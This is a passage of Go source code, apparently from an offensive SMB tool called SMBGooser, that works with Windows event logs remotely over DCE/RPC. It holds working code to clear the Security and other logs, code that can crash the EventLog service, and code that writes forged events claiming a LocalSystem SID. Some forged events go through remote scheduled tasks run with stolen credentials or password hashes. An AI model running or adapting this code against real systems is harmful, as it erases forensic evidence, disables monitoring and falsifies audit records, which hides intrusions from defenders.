		return fmt.Errorf("invalid control handle response")
	}

	var controlHandle [20]byte
	copy(controlHandle[:], resp[:20])
	retCode := binary.LittleEndian.Uint32(resp[20:24])
	if retCode != 0 {
		return fmt.Errorf("failed to get control handle: 0x%08X", retCode)
	}

	// Step 2: Clear the log
	info_("Clearing %s log via even6 API...", logName)
	clearStub := encodeEvtRpcClearLog(controlHandle, logName, backupPath)
	resp, err = rpc.Call(opEvtRpcClearLog, clearStub)
	if err != nil {
		return fmt.Errorf("EvtRpcClearLog failed: %w", err)
	}

	if len(resp) >= 4 {
		errCode := binary.LittleEndian.Uint32(resp[:4])
		if errCode != 0 {
			return fmt.Errorf("clear failed: 0x%08X", errCode)
		}
	}

	// Close the control handle
	closeStub := make([]byte, 20)
	copy(closeStub, controlHandle[:])
	rpc.Call(opEvtRpcClose, closeStub)

	success_("Event log %s cleared!", logName)
	return nil
}

// clearEventLogLegacy uses the MS-EVEN API (ElfrClearELFW)
// Note: This may crash the EventLog service on some Windows versions
func clearEventLogLegacy(ctx context.Context, logName, backupPath string) error {
	info_("Connecting to Event Log service (legacy API)...")
	rpc, logHandle, err := openEventLog(ctx, logName)
	if err != nil {
		return err
	}
	defer closeEventLog(rpc, logHandle)

	if backupPath != "" {
		info_("Clearing %s log with backup to %s...", logName, backupPath)
	} else {
		warn_("Clearing %s log (may crash EventLog service)...", logName)
	}

	clearStub := encodeClearEventLog(logHandle, backupPath)
	resp, err := rpc.Call(opElfrClearELFW, clearStub)
	if err != nil {
		// Check if service crashed (pipe disconnected)
		if strings.Contains(err.Error(), "0xC000014B") || strings.Contains(err.Error(), "disconnect") {
			warn_("EventLog service crashed/stopped (log collection disabled)")
			info_("Use 'svc start EventLog' to restart the service")
			return nil
		}
		return fmt.Errorf("ElfrClearELFW failed: %w", err)
	}

	if len(resp) >= 4 {
		retCode := binary.LittleEndian.Uint32(resp[:4])
		if retCode != 0 {
			return fmt.Errorf("clear failed: 0x%08X", retCode)
		}
	}

	success_("Event log %s cleared!", logName)
	return nil
}

// encodeEvtRpcClearLog encodes the EvtRpcClearLog request (even6 API)
func encodeEvtRpcClearLog(handle [20]byte, channelPath, backupPath string) []byte {
	stub := make([]byte, 0, 128)

	// Handle (20 bytes)
	stub = append(stub, handle[:]...)

	// ChannelPath (WSTR - null-terminated UTF-16LE)
	channelBytes := utf16Encode(channelPath)
	stub = appendUint32EL(stub, uint32(len(channelPath)+1)) // MaxCount
	stub = appendUint32EL(stub, 0)                          // Offset
	stub = appendUint32EL(stub, uint32(len(channelPath)+1)) // ActualCount
	stub = append(stub, channelBytes...)
	stub = append(stub, 0, 0) // Null terminator
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}

	// BackupPath (WSTR - can be empty)
	if backupPath == "" {
		stub = appendUint32EL(stub, 1) // MaxCount = 1 (just null)
		stub = appendUint32EL(stub, 0) // Offset
		stub = appendUint32EL(stub, 1) // ActualCount = 1 (just null)
		stub = append(stub, 0, 0)      // Null terminator
		for len(stub)%4 != 0 {
			stub = append(stub, 0)
		}
	} else {
		backupBytes := utf16Encode(backupPath)
		stub = appendUint32EL(stub, uint32(len(backupPath)+1)) // MaxCount
		stub = appendUint32EL(stub, 0)                         // Offset
		stub = appendUint32EL(stub, uint32(len(backupPath)+1)) // ActualCount
		stub = append(stub, backupBytes...)
		stub = append(stub, 0, 0) // Null terminator
		for len(stub)%4 != 0 {
			stub = append(stub, 0)
		}
	}

	// Flags (DWORD = 0)
	stub = appendUint32EL(stub, 0)

	return stub
}

// cmdEventLogBackup backs up an event log
func cmdEventLogBackup(ctx context.Context, args []string) error {
	if len(args) < 2 {
		fmt.Println("Usage: eventlog backup <log> <path>")
		fmt.Println("Example: eventlog backup Security C:\\Windows\\Temp\\sec.evtx")
		return nil
	}

	logName := args[0]
	userPath := args[1]

	// Convert to device path format (required by Windows RPC)
	// User provides: C:\Windows\Temp\sec.evtx
	// RPC needs:     \??\C:\Windows\Temp\sec.evtx
	backupPath := toDevicePath(userPath)

	info_("Connecting to Event Log service...")
	rpc, logHandle, err := openEventLog(ctx, logName)
	if err != nil {
		return err
	}
	defer closeEventLog(rpc, logHandle)

	info_("Backing up %s to %s...", logName, userPath)

	// Encode backup request
	backupStub := encodeBackupEventLog(logHandle, backupPath)
	resp, err := rpc.Call(opElfrBackupELFW, backupStub)
	if err != nil {
		return fmt.Errorf("ElfrBackupELFW failed: %w", err)
	}

	if len(resp) >= 4 {
		retCode := binary.LittleEndian.Uint32(resp[:4])
		if retCode != 0 {
			return fmt.Errorf("backup failed: 0x%08X", retCode)
		}
	}

	success_("Event log backed up to %s", userPath)
	return nil
}

// toDevicePath converts a regular Windows path to device path format
// C:\path\file.evtx -> \??\C:\path\file.evtx
func toDevicePath(path string) string {
	// Already in device path format
	if strings.HasPrefix(path, `\??\`) || strings.HasPrefix(path, `\\??\`) {
		return path
	}
	return `\??\` + path
}

// cmdEventLogWrite writes a custom event to the log
// Uses RPC API by default, -schtask flag for scheduled task fallback
func cmdEventLogWrite(ctx context.Context, args []string) error {
	if len(args) < 2 {
		fmt.Println("Usage: eventlog write <log> <message> [eventid] [-schtask]")
		fmt.Println("Example: eventlog write Application \"Test event from SMBGooser\"")
		fmt.Println("Example: eventlog write Application \"Custom event\" 1337")
		fmt.Println()
		fmt.Println("Options:")
		fmt.Println("  -schtask  Use scheduled task instead of RPC (fallback)")
		return nil
	}

	logName := args[0]
	message := args[1]
	useSchtask := false
	eventID := uint32(1000)

	// Parse options
	for i := 2; i < len(args); i++ {
		arg := args[i]
		if arg == "-schtask" || arg == "--schtask" {
			useSchtask = true
		} else {
			// Try to parse as event ID
			if id, err := strconv.ParseUint(arg, 10, 32); err == nil {
				eventID = uint32(id)
			}
		}
	}

	if useSchtask {
		return writeEventLogViaSchtask(ctx, logName, message, eventID)
	}

	// Default: RPC method
	return writeEventLogViaRPC(ctx, logName, message, eventID)
}

// writeEventLogViaRPC writes event using ElfrReportEventW RPC call
func writeEventLogViaRPC(ctx context.Context, logName, message string, eventID uint32) error {
	info_("Connecting to Event Log service...")
	rpc, logHandle, err := openEventLog(ctx, logName)
	if err != nil {
		return err
	}
	defer closeEventLog(rpc, logHandle)

	info_("Writing event to %s log (id=%d)...", logName, eventID)

	writeStub := encodeWriteEventLog(logHandle, eventInformation, eventID, message)
	resp, err := rpc.Call(opElfrReportEventW, writeStub)
	if err != nil {
		return fmt.Errorf("ElfrReportEventW failed: %w", err)
	}

	if len(resp) >= 4 {
		retCode := binary.LittleEndian.Uint32(resp[len(resp)-4:])
		if retCode != 0 {
			return fmt.Errorf("write failed: 0x%08X", retCode)
		}
	}

	success_("Event written to %s log (ID: %d)", logName, eventID)
	return nil
}

// writeEventLogViaSchtask writes event using eventcreate.exe via scheduled task
func writeEventLogViaSchtask(ctx context.Context, logName, message string, eventID uint32) error {
	// Build eventcreate command
	cmd := fmt.Sprintf(`eventcreate /L %s /T INFORMATION /ID %d /D "%s"`, logName, eventID, message)

	info_("Writing event to %s log via scheduled task...", logName)

	// Use the tsch package which handles Task Scheduler RPC correctly
	creds := tsch.Credentials{
		Username: currentUser,
		Password: currentPassword,
		Hash:     currentHash,
		Domain:   currentDomain,
	}
	tschClient, err := tsch.NewClient(ctx, client, creds)
	if err != nil {
		return fmt.Errorf("failed to create TSCH client: %w", err)
	}
	defer tschClient.Close()

	// Execute the eventcreate command
	if err := tschClient.Execute(cmd); err != nil {
		return fmt.Errorf("scheduled task execution failed: %w", err)
	}

	success_("Event written to %s log (ID: %d)", logName, eventID)
	return nil
}

// openEventLog opens a connection to the event log and returns the RPC client and handle
func openEventLog(ctx context.Context, logName string) (*dcerpc.Client, [20]byte, error) {
	var handle [20]byte

	tree, err := client.GetIPCTree(ctx)
	if err != nil {
		return nil, handle, fmt.Errorf("failed to connect to IPC$: %w", err)
	}

	p, err := pipe.Open(ctx, tree, "eventlog")
	if err != nil {
		return nil, handle, fmt.Errorf("failed to open eventlog pipe: %w", err)
	}

	rpc := dcerpc.NewClient(p)

	if err := rpc.Bind(eventlogUUID, 0); err != nil {
		p.Close()
		return nil, handle, fmt.Errorf("failed to bind: %w", err)
	}

	// Open event log
	openStub := encodeOpenEventLog(logName)
	resp, err := rpc.Call(opElfrOpenELW, openStub)
	if err != nil {
		rpc.Close()
		p.Close()
		return nil, handle, fmt.Errorf("ElfrOpenELW failed: %w", err)
	}

	if len(resp) < 24 {
		rpc.Close()
		p.Close()
		return nil, handle, fmt.Errorf("invalid response")
	}

	copy(handle[:], resp[:20])
	retCode := binary.LittleEndian.Uint32(resp[20:24])
	if retCode != 0 {
		rpc.Close()
		p.Close()
		return nil, handle, fmt.Errorf("failed to open log: 0x%08X", retCode)
	}

	return rpc, handle, nil
}

// closeEventLog closes the event log handle and RPC client
func closeEventLog(rpc *dcerpc.Client, handle [20]byte) {
	closeStub := make([]byte, 20)
	copy(closeStub, handle[:])
	rpc.Call(opElfrCloseEL, closeStub)
	rpc.Close()
}

// encodeClearEventLog encodes ElfrClearELFW request
// BackupFileName is PRPC_UNICODE_STRING (pointer to RPC_UNICODE_STRING)
func encodeClearEventLog(handle [20]byte, backupPath string) []byte {
	stub := make([]byte, 0, 128)
	stub = append(stub, handle[:]...)

	if backupPath == "" {
		// NULL pointer for backup file - just 4 bytes of 0
		stub = appendUint32EL(stub, 0)
	} else {
		// PRPC_UNICODE_STRING structure:
		// 1. Referent ID (4 bytes) - non-zero indicates pointer is valid
		// 2. RPC_UNICODE_STRING:
		//    - Length (2 bytes) - byte length of string
		//    - MaxLength (2 bytes) - same as Length
		//    - Pointer referent (4 bytes) - pointer to string data
		// 3. Conformant array:
		//    - MaxCount (4 bytes) - character count
		//    - Offset (4 bytes) - 0
		//    - ActualCount (4 bytes) - character count
		//    - String data (UTF-16LE)

		nameBytes := utf16Encode(backupPath)
		byteLength := uint16(len(nameBytes)) // Length in bytes
		charCount := uint32(len(backupPath)) // Character count

		// Referent ID for PRPC_UNICODE_STRING
		stub = appendUint32EL(stub, 0x00020000) // Non-zero referent

		// RPC_UNICODE_STRING embedded structure
		stub = appendUint16EL(stub, byteLength) // Length
		stub = appendUint16EL(stub, byteLength) // MaxLength

		// Pointer referent for the string data
		stub = appendUint32EL(stub, 0x00020004) // Non-zero referent

		// Conformant array header
		stub = appendUint32EL(stub, charCount) // MaxCount
		stub = appendUint32EL(stub, 0)         // Offset
		stub = appendUint32EL(stub, charCount) // ActualCount

		// String data
		stub = append(stub, nameBytes...)

		// Pad to 4 bytes if needed
		for len(stub)%4 != 0 {
			stub = append(stub, 0)
		}
	}

	return stub
}

// encodeBackupEventLog encodes ElfrBackupELFW request
func encodeBackupEventLog(handle [20]byte, backupPath string) []byte {
	stub := make([]byte, 0, 128)
	stub = append(stub, handle[:]...)

	// RPC_UNICODE_STRING for backup file (Impacket format)
	nameBytes := utf16Encode(backupPath)
	length := uint16(len(nameBytes))

	stub = appendUint16EL(stub, length)     // Length
	stub = appendUint16EL(stub, length)     // MaxLength = Length
	stub = appendUint32EL(stub, 0x00020000) // Pointer

	stub = appendUint32EL(stub, uint32(len(backupPath))) // MaxCount (no null)
	stub = appendUint32EL(stub, 0)                       // Offset
	stub = appendUint32EL(stub, uint32(len(backupPath))) // ActualCount (no null)
	stub = append(stub, nameBytes...)                    // No null terminator

	// Pad to 4 bytes
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}

	if verbose {
		fmt.Printf("[DEBUG] encodeBackupEventLog stub (%d bytes): %x\n", len(stub), stub)
	}

	return stub
}

// encodeWriteEventLog encodes ElfrReportEventW request
// Based on exact analysis of Impacket's NDR encoding
func encodeWriteEventLog(handle [20]byte, eventType uint16, eventID uint32, message string) []byte {
	stub := make([]byte, 0, 256)

	// === Fixed header (bytes 0x00-0x2f) ===

	// Handle (20 bytes, 0x00-0x13)
	stub = append(stub, handle[:]...)

	// Time (4 bytes, 0x14-0x17)
	stub = appendUint32EL(stub, uint32(time.Now().Unix()))

	// EventType (2 bytes, 0x18-0x19)
	stub = appendUint16EL(stub, eventType)

	// EventCategory (2 bytes, 0x1a-0x1b)
	stub = appendUint16EL(stub, 0)

	// EventID (4 bytes, 0x1c-0x1f)
	stub = appendUint32EL(stub, eventID)

	// NumStrings (2 bytes, 0x20-0x21)
	stub = appendUint16EL(stub, 1)

	// Padding (2 bytes, 0x22-0x23) - Impacket uses junk, we use zeros
	stub = appendUint16EL(stub, 0)

	// DataSize (4 bytes, 0x24-0x27)
	stub = appendUint32EL(stub, 0)

	// ComputerName RPC_UNICODE_STRING header (8 bytes, 0x28-0x2f)
	computerName := "SMBGOOSER"
	compBytes := utf16Encode(computerName)
	stub = appendUint16EL(stub, uint16(len(compBytes))) // Length (2 bytes)
	stub = appendUint16EL(stub, uint16(len(compBytes))) // MaxLength (2 bytes)
	stub = appendUint32EL(stub, 0x00020000)             // Pointer (4 bytes)

	// === ComputerName Data (inline after header, 0x30-0x4f) ===
	stub = appendUint32EL(stub, uint32(len(computerName))) // MaxCount
	stub = appendUint32EL(stub, 0)                         // Offset
	stub = appendUint32EL(stub, uint32(len(computerName))) // ActualCount
	stub = append(stub, compBytes...)
	// Pad to 4-byte boundary
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}

	// === UserSID Pointer (4 bytes, 0x50-0x53) ===
	stub = appendUint32EL(stub, 0x00020004)

	// === UserSID Data (inline, 0x54-0x63) ===
	// PRPC_SID is conformant - MaxCount first (number of SubAuthorities)
	stub = appendUint32EL(stub, 1) // MaxCount = 1 SubAuthority
	// SID_IDENTIFIER_AUTHORITY: 6 bytes, value = 5 (NT Authority)
	// Revision = 1, SubAuthorityCount = 1
	stub = append(stub, 0x01)       // Revision
	stub = append(stub, 0x01)       // SubAuthorityCount
	stub = append(stub, 0, 0, 0, 0) // Authority bytes 0-3
	stub = append(stub, 0, 5)       // Authority bytes 4-5 = 5 (NT Authority)
	// SubAuthority[0] = 18 (LocalSystem)
	stub = appendUint32EL(stub, 18)

	// === Strings Pointer (4 bytes, 0x64-0x67) ===
	stub = appendUint32EL(stub, 0x00020008)

	// === Strings Array Data ===
	// Array MaxCount (4 bytes, 0x68-0x6b)
	stub = appendUint32EL(stub, 1)

	// Array element [0] - this is a PRPC_UNICODE_STRING (pointer)
	// The element itself has a pointer referent (4 bytes, 0x6c-0x6f)
	stub = appendUint32EL(stub, 0x0002000c)

	// After the array of pointers, the pointed-to RPC_UNICODE_STRING structures come
	// RPC_UNICODE_STRING[0]: Length(2) + MaxLength(2) + Pointer(4)
	msgBytes := utf16Encode(message)
	stub = appendUint16EL(stub, uint16(len(msgBytes))) // Length (2 bytes)
	stub = appendUint16EL(stub, uint16(len(msgBytes))) // MaxLength (2 bytes)
	stub = appendUint32EL(stub, 0x00020010)            // Pointer (4 bytes)

	// String[0] data (conformant array)
	stub = appendUint32EL(stub, uint32(len(message))) // MaxCount
	stub = appendUint32EL(stub, 0)                    // Offset
	stub = appendUint32EL(stub, uint32(len(message))) // ActualCount
	stub = append(stub, msgBytes...)
	// Pad to 4 bytes
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}

	// === Remaining fields at the END ===

	// Data pointer (4 bytes) - NULL
	stub = appendUint32EL(stub, 0)

	// Flags (2 bytes)
	stub = appendUint16EL(stub, 0)

	// Padding (2 bytes)
	stub = appendUint16EL(stub, 0)

	// RecordNumber pointer (4 bytes) - NULL
	stub = appendUint32EL(stub, 0)

	// TimeWritten pointer (4 bytes) - NULL
	stub = appendUint32EL(stub, 0)

	return stub
}

// ============================================================================
// Event Log Virtual Filesystem Commands
// ============================================================================

// Known event logs
var knownEventLogs = []string{"Security", "System", "Application"}

// cmdUseEventLog mounts the event log virtual filesystem
func cmdUseEventLog(ctx context.Context, args []string) error {
	if client == nil || session == nil {
		return fmt.Errorf("not connected")
	}

	// Exit current share mode if any
	if currentTree != nil {
		client.TreeDisconnect(ctx, currentTree)
		currentTree = nil
		currentPath = ""
	}

	info_("Mounting event log virtual filesystem...")

	// Test connectivity by trying to open any log
	// Application and System are usually accessible, Security requires admin
	testLogs := []string{"Application", "System", "Security"}
	connected := false
	for _, logName := range testLogs {
		rpc, handle, err := openEventLog(ctx, logName)
		if err == nil {
			closeEventLog(rpc, handle)
			connected = true
			break
		}
	}

	if !connected {
		return fmt.Errorf("failed to connect to Event Log service (access denied to all logs)")
	}

	eventlogMode = true
	eventlogPath = ""

	success_("Connected to Event Log service")
	info_("Use 'ls' to list logs, 'cd <log>' to enter, 'find <pattern>' to search")

	return nil
}

// cmdEventLogLs lists logs or events (called when in eventlog mode)
func cmdEventLogLs(ctx context.Context, args []string) error {
	if eventlogPath == "" {
		// At root - list available logs
		return listEventLogs(ctx)
	}
	// Inside a log - list events
	return listEvents(ctx, eventlogPath, args)
}

// listEventLogs shows available event logs with counts
func listEventLogs(ctx context.Context) error {
	fmt.Println()
	fmt.Printf("  %sEvent Logs:%s\n", colorBold, colorReset)
	fmt.Println("  " + strings.Repeat("-", 50))
	fmt.Printf("  %-20s %s\n", "LOG", "RECORDS")
	fmt.Println("  " + strings.Repeat("-", 50))

	for _, logName := range knownEventLogs {
		count, err := getEventLogCount(ctx, logName)
		if err != nil {
			fmt.Printf("  %-20s %s(unavailable)%s\n", logName, colorRed, colorReset)
		} else {
			fmt.Printf("  %-20s %d\n", logName, count)
		}
	}

	fmt.Println()
	info_("Use 'cd <logname>' to enter a log")
	return nil
}

// getEventLogCount returns the number of records in a log
func getEventLogCount(ctx context.Context, logName string) (uint32, error) {
	rpc, handle, err := openEventLog(ctx, logName)
	if err != nil {
		return 0, err
	}
	defer closeEventLog(rpc, handle)

	// ElfrNumberOfRecords - opnum 4
	stub := make([]byte, 20)
	copy(stub[0:20], handle[:])

	resp, err := rpc.Call(4, stub) // OpElfrNumberOfRecords
	if err != nil {
		return 0, err
	}

	if len(resp) >= 8 {
		count := binary.LittleEndian.Uint32(resp[0:4])
		return count, nil
	}

	return 0, fmt.Errorf("invalid response")
}

// listEvents shows events in a log
func listEvents(ctx context.Context, logName string, args []string) error {
	count := 20 // default
	for _, arg := range args {
		if strings.HasPrefix(arg, "-n") {
			if num, err := strconv.Atoi(strings.TrimPrefix(arg, "-n")); err == nil && num > 0 {
				count = num
			}
		} else if n, err := strconv.Atoi(arg); err == nil && n > 0 {
			count = n
		}
	}

	rpc, handle, err := openEventLog(ctx, logName)
	if err != nil {
		return fmt.Errorf("failed to open %s log: %w", logName, err)
	}
	defer closeEventLog(rpc, handle)

	stub := encodeReadEventLog(handle, count)
	resp, err := rpc.Call(10, stub) // OpElfrReadELW
	if err != nil {
		return fmt.Errorf("failed to read events: %w", err)
	}

	// Use the original working parser
	eventStrings := parseEventLogResponse(resp)

	fmt.Println()
	fmt.Printf("  %sEvents in %s:%s\n", colorBold, logName, colorReset)
	fmt.Println("  " + strings.Repeat("-", 80))

	if len(eventStrings) == 0 {
		fmt.Println("  No events found or unable to parse")
	} else {
		for _, e := range eventStrings {
			fmt.Println("  " + e)
		}
	}

	fmt.Println()
	info_("Showing %d events (use 'ls -n50' for more)", len(eventStrings))
	return nil
}

// EventRecord represents a parsed event
type EventRecord struct {
	RecordNumber uint32
	Time         time.Time
	EventID      uint32
	Level        string
	Source       string
	Computer     string
	Strings      []string
	RawData      []byte
}

// parseEventLogResponseEx parses response into EventRecord structs
func parseEventLogResponseEx(resp []byte) []EventRecord {
	var events []EventRecord

	if len(resp) < 20 {
		return events
	}

	offset := 0
	// Skip header info
	if offset+8 > len(resp) {
		return events
	}
	offset += 8 // ReadCount + ReadData pointer

	// Data length
	if offset+4 > len(resp) {
		return events
	}
	dataLen := binary.LittleEndian.Uint32(resp[offset:])
	offset += 4

	if dataLen == 0 || offset+int(dataLen) > len(resp) {
		return events
	}

	data := resp[offset : offset+int(dataLen)]

	// Parse individual records
	pos := 0
	for pos+56 < len(data) {
		recordLen := binary.LittleEndian.Uint32(data[pos : pos+4])
		if recordLen < 56 || pos+int(recordLen) > len(data) {
			break
		}

		record := data[pos : pos+int(recordLen)]
		evt := parseEventRecordEx(record)
		if evt.RecordNumber > 0 {
			events = append(events, evt)
		}

		pos += int(recordLen)
	}

	return events
}

// parseEventRecordEx parses a single EVENTLOGRECORD into EventRecord
func parseEventRecordEx(record []byte) EventRecord {
	var evt EventRecord

	if len(record) < 56 {
		return evt
	}

	evt.RecordNumber = binary.LittleEndian.Uint32(record[8:12])
	timeGenerated := binary.LittleEndian.Uint32(record[12:16])
	evt.Time = time.Unix(int64(timeGenerated), 0)
	eventIDFull := binary.LittleEndian.Uint32(record[20:24])
	evt.EventID = eventIDFull & 0xFFFF
	eventType := binary.LittleEndian.Uint16(record[24:26])
	numStrings := binary.LittleEndian.Uint16(record[26:28])
	stringOffset := binary.LittleEndian.Uint32(record[36:40])

	// Event level
	switch eventType {
	case 1:
		evt.Level = "Error"
	case 2:
		evt.Level = "Warning"
	case 4:
		evt.Level = "Info"
	case 8:
		evt.Level = "Audit OK"
	case 16:
		evt.Level = "Audit Fail"
	default:
		evt.Level = "Unknown"
	}

	// Source name
	if len(record) > 56 {
		evt.Source = readUTF16String(record[56:])
	}

	// Computer name
	if len(record) > 56 {
		sourceLen := len(evt.Source)*2 + 2
		computerOffset := 56 + sourceLen
		if computerOffset < len(record) {
			evt.Computer = readUTF16String(record[computerOffset:])
		}
	}

	// Event strings
	if numStrings > 0 && int(stringOffset) < len(record) {
		stringsData := record[stringOffset:]
		for i := 0; i < int(numStrings) && len(stringsData) > 0; i++ {
			s := readUTF16String(stringsData)
			if s != "" {
				evt.Strings = append(evt.Strings, s)
			}
			skip := (len(s) + 1) * 2
			if skip > len(stringsData) {
				break
			}
			stringsData = stringsData[skip:]
		}
	}

	evt.RawData = record

	return evt
}

// cmdEventLogCd navigates into/out of logs
func cmdEventLogCd(ctx context.Context, args []string) error {
	if len(args) == 0 || args[0] == ".." {
		eventlogPath = ""
		return nil
	}

	target := args[0]

	// Check if valid log
	for _, log := range knownEventLogs {
		if strings.EqualFold(log, target) {
			eventlogPath = log
			return nil
		}
	}

	return fmt.Errorf("unknown log: %s (use: Security, System, Application)", target)
}

// cmdEventLogCat shows full details of an event
func cmdEventLogCat(ctx context.Context, args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("usage: cat <record_id>")
	}

	recordID, err := strconv.ParseUint(args[0], 10, 32)
	if err != nil {
		return fmt.Errorf("invalid record ID: %s", args[0])
	}

	logName := eventlogPath
	if logName == "" {
		logName = "Security" // default
	}

	// Read events and find the one we want
	rpc, handle, err := openEventLog(ctx, logName)
	if err != nil {
		return fmt.Errorf("failed to open log: %w", err)
	}
	defer closeEventLog(rpc, handle)

	stub := encodeReadEventLog(handle, 100) // Read batch
	resp, err := rpc.Call(10, stub)
	if err != nil {
		return fmt.Errorf("failed to read events: %w", err)
	}

	// Parse the raw response to find our event
	record, found := findEventRecord(resp, uint32(recordID))
	if !found {
		return fmt.Errorf("event %d not found in recent events", recordID)
	}

	// Parse the full record
	if len(record) < 56 {
		return fmt.Errorf("invalid event record")
	}

	recNum := binary.LittleEndian.Uint32(record[8:12])
	timeGen := binary.LittleEndian.Uint32(record[12:16])
	eventIDFull := binary.LittleEndian.Uint32(record[20:24])
	eventID := eventIDFull & 0xFFFF
	eventType := binary.LittleEndian.Uint16(record[24:26])
	numStrings := binary.LittleEndian.Uint16(record[26:28])
	eventCategory := binary.LittleEndian.Uint16(record[28:30])
	stringOffset := binary.LittleEndian.Uint32(record[36:40])

	// Extract source and computer names
	sourceName := ""
	computerName := ""
	if len(record) > 56 {
		sourceName = readUTF16String(record[56:])
		sourceLen := len(sourceName)*2 + 2
		computerOffset := 56 + sourceLen
		if computerOffset < len(record) {
			computerName = readUTF16String(record[computerOffset:])
		}
	}

	// Extract event strings
	var eventStrings []string
	if numStrings > 0 && int(stringOffset) < len(record) {
		stringsData := record[stringOffset:]
		for i := 0; i < int(numStrings) && len(stringsData) > 0; i++ {
			s := readUTF16String(stringsData)
			if s != "" {
				eventStrings = append(eventStrings, s)
			}
			skip := (len(s) + 1) * 2
			if skip > len(stringsData) {
				break
			}
			stringsData = stringsData[skip:]
		}
	}

	t := time.Unix(int64(timeGen), 0)

	// Event type string
	typeStr := "Information"
	switch eventType {
	case 1:
		typeStr = colorRed + "Error" + colorReset
	case 2:
		typeStr = colorYellow + "Warning" + colorReset
	case 4:
		typeStr = "Information"
	case 8:
		typeStr = colorGreen + "Audit Success" + colorReset
	case 16:
		typeStr = colorRed + "Audit Failure" + colorReset
	}

	// Display full details
	fmt.Println()
	fmt.Println("  " + strings.Repeat("═", 70))
	fmt.Printf("  %sEvent Record #%d%s\n", colorBold, recNum, colorReset)
	fmt.Println("  " + strings.Repeat("═", 70))
	fmt.Printf("  %-15s %s\n", "Log:", logName)
	fmt.Printf("  %-15s %s\n", "Time:", t.Format("2006-01-02 15:04:05 MST"))
	fmt.Printf("  %-15s %d\n", "Event ID:", eventID)
	fmt.Printf("  %-15s %s\n", "Level:", typeStr)
	fmt.Printf("  %-15s %s\n", "Source:", sourceName)
	fmt.Printf("  %-15s %s\n", "Computer:", computerName)
	if eventCategory > 0 {
		fmt.Printf("  %-15s %d\n", "Category:", eventCategory)
	}

	if len(eventStrings) > 0 {
		fmt.Println()
		fmt.Printf("  %sEvent Data (%d strings):%s\n", colorBold, len(eventStrings), colorReset)
		fmt.Println("  " + strings.Repeat("-", 60))
		for i, s := range eventStrings {
			if s != "" && s != "-" {
				// Truncate very long strings
				display := s
				if len(display) > 200 {
					display = display[:200] + "..."
				}
				fmt.Printf("  [%d] %s\n", i, display)
			}
		}
	}

	fmt.Println("  " + strings.Repeat("═", 70))
	fmt.Println()

	return nil
}

// findEventRecord finds a specific event record by ID in the response
func findEventRecord(resp []byte, recordID uint32) ([]byte, bool) {
	if len(resp) < 20 {
		return nil, false
	}

	// NDRUniConformantArray format: MaxCount (4 bytes) + data
	// Response: MaxCount + Buffer + NumberOfBytesRead (4) + MinNumberOfBytesNeeded (4) + ErrorCode (4)
	maxCount := binary.LittleEndian.Uint32(resp[:4])

	if maxCount == 0 {
		return nil, false
	}

	// The buffer starts at offset 4
	bufferStart := 4
	// Trailer is at the end: NumberOfBytesRead + MinBytes + ErrorCode = 12 bytes
	if len(resp) < int(maxCount)+bufferStart+12 {
		return nil, false
	}

	// Parse trailer
	trailerStart := bufferStart + int(maxCount)
	bytesRead := binary.LittleEndian.Uint32(resp[trailerStart:])

	if bytesRead == 0 {
		return nil, false
	}

	// Event data is in the buffer starting at offset 4 (after MaxCount)
	bufferData := resp[bufferStart : bufferStart+int(bytesRead)]

	offset := 0
	for offset+56 < len(bufferData) {
		length := binary.LittleEndian.Uint32(bufferData[offset:])
		if length < 56 || length > 0xFFFF || offset+int(length) > len(bufferData) {
			break
		}

		// Verify magic number (0x654c664c = "LfLe")
		if offset+8 <= len(bufferData) {
			magic := binary.LittleEndian.Uint32(bufferData[offset+4:])
			if magic != 0x654c664c {
				break
			}
		}

		record := bufferData[offset : offset+int(length)]
		recNum := binary.LittleEndian.Uint32(record[8:12])
		if recNum == recordID {
			return record, true
		}

		offset += int(length)
	}

	return nil, false
}

// cmdEventLogFind searches all logs for a pattern
func cmdEventLogFind(ctx context.Context, args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("usage: find <pattern>")
	}

	pattern := strings.ToLower(args[0])
	info_("Searching all logs for '%s'...", pattern)

	var matches []struct {
		Log   string
		Event EventRecord
		Match string
	}

	for _, logName := range knownEventLogs {
		rpc, handle, err := openEventLog(ctx, logName)
		if err != nil {
			continue
		}

		stub := encodeReadEventLog(handle, 50)
		resp, err := rpc.Call(10, stub)
		closeEventLog(rpc, handle)

		if err != nil {
			continue
		}

		events := parseEventLogResponseEx(resp)
		for _, evt := range events {
			matchText := ""

			// Check event ID
			if strings.Contains(fmt.Sprintf("%d", evt.EventID), pattern) {
				matchText = fmt.Sprintf("Event ID: %d", evt.EventID)
			}

			// Check source
			if strings.Contains(strings.ToLower(evt.Source), pattern) {
				matchText = fmt.Sprintf("Source: %s", evt.Source)
			}

			// Check strings
			for _, s := range evt.Strings {
				if strings.Contains(strings.ToLower(s), pattern) {
					matchText = truncateStr(s, 40)
					break
				}
			}

			if matchText != "" {
				matches = append(matches, struct {
					Log   string
					Event EventRecord
					Match string
				}{logName, evt, matchText})
			}
		}
	}

	fmt.Println()
	if len(matches) == 0 {
		warn_("No matches found for '%s'", pattern)
		return nil
	}

	fmt.Printf("  %sSearch Results for '%s':%s\n", colorBold, pattern, colorReset)
	fmt.Println("  " + strings.Repeat("-", 80))
	fmt.Printf("  %-10s %-12s %-20s %-8s %s\n", "RECORD", "LOG", "TIME", "EVENT", "MATCH")
	fmt.Println("  " + strings.Repeat("-", 80))

	for _, m := range matches {
		fmt.Printf("  %-10d %-12s %-20s %-8d %s\n",
			m.Event.RecordNumber, m.Log,
			m.Event.Time.Format("2006-01-02 15:04"),
			m.Event.EventID,
			truncateStr(m.Match, 30))
	}

	fmt.Println()
	success_("Found %d matching events", len(matches))
	return nil
}

// cmdEventLogDisconnect exits eventlog mode
func cmdEventLogDisconnect(ctx context.Context, args []string) error {
	if eventlogMode {
		eventlogMode = false
		eventlogPath = ""
		success_("Disconnected from Event Log service")
	}
	return nil
}
